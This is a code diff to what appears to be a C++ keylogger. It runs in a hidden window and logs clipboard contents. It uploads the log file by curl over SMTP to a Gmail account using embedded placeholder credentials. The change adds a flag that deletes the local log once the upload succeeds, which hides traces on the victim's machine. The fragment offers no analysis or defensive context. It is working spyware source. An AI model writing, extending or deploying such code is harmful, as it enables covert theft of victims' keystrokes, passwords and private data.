@@ -20,11 +20,13 @@ const string EmailFromPassword = "YourPassowrd";
 const string EmailTo = "example@gmail.com";
 const bool IsWindowHidden = true;
 const bool LogClipboard = true;
+const bool RemoveLogsAfterSend = true; //It will remove Logs ONLY when sending log will be sucessfully
 
 
-void send() {
+int send() {
 	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"" + EmailFrom + "\\\" --mail-rcpt \\\"" + EmailTo + "\\\" --ssl --upload-file %temp%\\" + LogFileName + " -u " + EmailFrom + ":" + EmailFromPassword + " -k --anyauth";
-	system(cmd.c_str());
+	int info = system(cmd.c_str());
+	return info;
 }
 inline bool filexits(const string& name) {
 	struct stat buffer;
@@ -194,7 +196,9 @@ int main()
 			LogFile.open(LogFileName, fstream::app);
 			LogFile << endl << "#|#" << asctime(tt);
 			LogFile.close();
-			send();
+			int info = send();
+
+			if(RemoveLogsAfterSend && info == 0)
 			remove(LogFileName.c_str());
 			IsOnlyOneTime = false;
 		}
